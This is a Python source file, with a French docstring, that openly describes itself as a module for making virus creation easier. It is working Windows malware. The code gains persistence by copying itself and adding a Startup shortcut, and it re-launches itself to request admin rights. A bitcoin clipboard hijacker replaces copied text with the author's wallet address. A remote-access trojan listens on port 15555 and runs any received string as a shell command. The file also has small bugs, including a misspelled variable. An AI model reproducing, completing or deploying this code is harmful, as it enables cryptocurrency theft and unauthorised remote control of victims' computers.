#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
    Ce module est conçu pour rendre plus facile d'accès la création de virus.
    Ne pas utiliser ce module sans l'accord de la victime.
"""

__all__ = ['Virus','get_executable','get_executable_path','get_executable_name','get_app_opt','is_param','exist_virus','copy_virus','create_shortcut','rebuild','is_admin','set_admin','force_admin','tts','rexecute','on_startup','execute_command','msgbox','volume','exit_all','get_clipboard','set_clipboard','clear_clipboard','bitcoin_paster','local_rat']
__version__ = "0.0.1"

import os, sys, time, uuid, io, ctypes, socket, winshell, subprocess, win32com.client, shutil, keyboard, pyttsx3
from win32com.client import Dispatch

# Create/Declare Virus

def Virus(destination, name):
    return [destination, name]

# Executable

def get_executable():
    return sys.argv[0]

def get_executable_path():
    return os.path.dirname(os.path.realpath(get_executable()))

def get_executable_name():
    return str(get_executable()).replace(get_executable_path() + "\\", "")

def get_app_opt(app, request):
    if request == "dest":
        return app[0]
    elif request == "name":
        return app[1]

# When call the function

def is_param(param):
    if len(sys.argv) == 2:
        if sys.argv[1] == param:
            return True
        else:
            return False
    else:
        return False

# File Gestion

def exist_virus(app):

    # get the opt of this app
    name = get_app_opt(app, "name")
    dest = get_app_opt(app, "dest")

    # if the virus exist by destination
    if os.path.exists(f"{dest}\\{name}"):
        return True
    else:
        return False

def copy_virus(app):
    if is_admin() == True:
        # get the opt of this app
        name = get_app_opt(app, "name")
        dest = get_app_opt(app, "dest")
        # create unique filename
        destination = dest + f"\\{name}"
        # define app
        folder = get_executable_path()
        # copy current file
        shutil.copytree(folder, destination)

def create_shortcut(app):
    if is_admin() == True:
        desktop = winshell.desktop()
        name = get_app_opt(app, "name")
        path = get_app_opt(app, "dest")
        exe = path + "\\" + name + "\\" + get_executable_name()
        shortcutPath = on_startup() + "\\" + name + ".lnk"

        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcutPath)
        shortcut.Targetpath = exe
        shortcut.WorkingDirectory = shortcutPath
        shortcut.IconLocation = exe
        shortcut.save()

def rebuild(app):
    name = get_app_opt(app, "name")
    path = get_app_opt(app, "dest")
    # remove
    os.remove(path + "\\" + name + ".lnk")
    shutil.rmtree(path + "\\" + name)
    # rebuild

# Admin

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def set_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, sys.argv[0], None, 1)

def force_admin():
    if is_admin() == False:
        # Re-run the program with admin rights
        set_admin()
        time.sleep(1)

# Others Functions

def tts(string):
    engine = pyttsx3.init()
    voices = engine.getProperty('voices')

    engine.setProperty('voice', voices[0].id)
    engine.say(string)
    engine.runAndWait()
    engine.stop()

def rexecute(app):
    time.sleep(1)
    execute_command("cd " + get_app_opt(app, "dest") + "\\" + get_app_opt(app, "name") + " && start " + get_executable_name())

# this function isn't in import *
def chars(txt):
    result = 0
    for char in txt:
        result += 1
    return result

def on_startup():
    return "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"

def execute_command(string):
    os.popen(string)

def msgbox(title, icon, content):
    if icon == "warning":
        icon = 48
    elif icon == "error":
        icon = 16
    elif icon == "info":
        icon = 64
    elif icon == "question":
        icon = 32
    else:
        icon = 0
    execute_command(f"echo x=msgbox(\"{content}\" ,0+{icon}+4096, \"{title}\") > script.vbs")
    execute_command("start script.vbs")
    time.sleep(0.5)
    execute_command("del script.vbs")

def volume(mode):
    if mode == "up":
        execute_command(f"echo var oShell = new ActiveXObject('WScript.Shell');\noShell.SendKeys(String.fromCharCode(0xAF)); > script.vbs")
        execute_command("start script.vbs")
        time.sleep(0.5)
        execute_command("del script.vbs")
    elif mode == "down":
        execute_command(f"echo var oShell = new ActiveXObject('WScript.Shell');\noShell.SendKeys(String.fromCharCode(0xAE)); > script.vbs")
        execute_command("start script.vbs")
        time.sleep(0.5)
        execute_command("del script.vbs")
    elif mode == "togglemute":
        execute_command(f"echo var oShell = new ActiveXObject('WScript.Shell');\noShell.SendKeys(String.fromCharCode(0xAD)); > script.vbs")
        execute_command("start script.vbs")
        time.sleep(0.5)
        execute_command("del script.vbs")

def exit_all():
    sys.exit()

# Clipboard

def get_clipboard():
    ctypes.windll.user32.OpenClipboard(0)
    pcontents = ctypes.windll.user32.GetClipboardData(13) # CF_UNICODETEXT
    data = ctypes.c_wchar_p(pcontents).value
    ctypes.windll.user32.CloseClipboard()
    return data

def set_clipboard(string):
    execute_command(f"echo {string} | clip")

def clear_clipboard(string):
    execute_command("echo off | clip")

# Virus Types

def bitcoin_paster(app, bitcoin_address):
    while True:
        try:
            data = get_clipboard()
            print(data)
            if chars(data) > 33:
                set_clipboard(bitcoin_address)
                return True
            else:
                return False
        except:
            return False

def local_rat(app, special_prefix):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("", 15555))
    except:
        return "restart"

    while True:
        s.listen(5)

        client, address = s.accept()
        victim_address = address[0]

        response = client.recv(255)
        
        transformed_response = response.decode()

        if transformed_response == f"{special_prefix}exit":
            return "exit"

        elif transformed_response.startswith(f"{special_prefix}clip"):
            # Get clipboard content after the special command.
            liste = transformed_response.split(" ")
            # Try to set the clipboard content.
            # Except, clear the current clipboard content.
            try:
                set_clipboard(' '.join(liste[1:]))
            except:
                clear_clipboard()

        elif transformed_response.startswith(f"{sp5ecial_prefix}msgbox"):
            # Split the plain text by space.
            liste = transformed_response.split(" ")
            # Data of message            (ex: ~msgbox title$part warning The message you wanna send)
            # Part id of date sended     (id: 0       1          2       3   4       5   6    7  8   )
            # So we need to join (gather the word of message by id 3)
            message = ' '.join(liste[3:])
            # Open the dialogue box with the function: msgbox(title, icon, message) :and replace $ in data by spaces after the message severally 
            msgbox(liste[1].replace("$", " "), liste[2], message)

        elif transformed_response == f"{special_prefix}restart":
            # Restart the virus
            return "restart"

        elif transformed_response.startswith(f'{special_prefix}tts'):
            liste = transformed_response.split(" ")
            tts(str(liste[1:]))


        elif transformed_response.startswith(f"{special_prefix}type"):
            liste = transformed_response.split(" ")
            replacement = str(liste[1:])
            keyboard.write(liste[1:].join(" "))

        elif transformed_response.startswith(f"{special_prefix}press"):
            liste = transformed_response.split(" ")
            keyboard.press_and_release(liste[1])

        elif transformed_response.startswith(f"{special_prefix}volume"):
            liste = transformed_response.split(" ")
            if liste[1] == "up":
                volume("up")
            elif liste[1] == "down":
                volume("down")
            else:
                volume("togglemute")

        else:
            # If isn't a "special command", send this in command prompt of the victim.
            execute_command(transformed_response)

    print("Close")
    s.close()


# if you need more informations go to --> documentation.rd <-- all functions are released in
# my bitcoin address for donations: 19KE6MT3QderKrfhb2zFv2hqz9JuFKBRWa